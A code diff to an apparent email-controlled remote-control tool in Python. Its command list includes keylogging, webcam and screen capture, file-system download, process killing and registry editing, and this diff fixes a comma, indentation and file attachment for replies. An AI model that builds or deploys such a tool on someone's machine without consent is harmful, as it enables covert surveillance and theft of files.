@@ -22,7 +22,7 @@ COMMANDS = ['HELP', 'LIST PROCESS', 'KILL PROCESS',
             'LIST APP', 'KILL APP',
             'CAPTURE SCREEN', 'RECORD SCREEN',
             'SHOT WEBCAM', 'RECORD WEBCAM',
-            'VIEW FILE SYSTEM', 'COPY FILE SYSTEM', 'DOWNLOAD FILE SYSTEM'
+            'VIEW FILE SYSTEM', 'COPY FILE SYSTEM', 'DOWNLOAD FILE SYSTEM',
             'KEYLOGGER',
             'SHUTDOWN', 'RESTART',
             'WRITE REGISTRY', 'GET REGISTRY', 'CREATE REGISTRY', 'SET REGISTRY', 'DELETE VALUE REGISTRY', 'DELETE KEY REGISTRY']
@@ -49,8 +49,8 @@ TEMPLATE_FILE_NAMES = {'LIST PROCESS': 'list-process.html',
                        'CREATE REGISTRY': 'create-registry.html',
                        'SET REGISTRY': 'set-registry.html',
                        'DELETE VALUE REGISTRY': 'delete-value-registry.html',
-                       'DELETE KEY REGISTRY': 'delete-key-registry.html', 
-                       'HELP': 'guide.html',}
+                       'DELETE KEY REGISTRY': 'delete-key-registry.html',
+                       'HELP': 'guide.html', }
 
 
 class Receiver():
@@ -111,6 +111,7 @@ class Receiver():
             return None, None
 
         subject, command_subject = mail_subject.split('-')
+
         if subject != RECOGNIZE_SUBJECT or command_subject not in COMMANDS:
             return None, None
 
@@ -150,19 +151,19 @@ class Receiver():
         command = original['Subject'].split('-')[1]
         if content == False:
             template = os.path.join(
-            TEMPLATE_PATH, 'wrong_execute.html')
+                TEMPLATE_PATH, 'wrong_execute.html')
             body_html = open(template)
             body_html = body_html.read()
             body_html = body_html.format(content)
         elif content == 'WrongSyntaxError404':
             template = os.path.join(
-            TEMPLATE_PATH, 'wrong_syntax.html')
+                TEMPLATE_PATH, 'wrong_syntax.html')
             body_html = open(template)
             body_html = body_html.read()
             body_html = body_html.format(content)
         elif content == 'AskForHelp':
             template = os.path.join(
-            TEMPLATE_PATH, 'guide.html')
+                TEMPLATE_PATH, 'guide.html')
             body_html = open(template)
             body_html = body_html.read()
             body_html = body_html.format(content)
@@ -237,7 +238,8 @@ class Receiver():
             file_name = content
             if command != 'DOWNLOAD FILE SYSTEM':
                 file_name = os.path.join('.temp', file_name)
-                mail.attach(self.attach_file(file_name))
+
+            mail.attach(self.attach_file(file_name))
 
         return mail
 
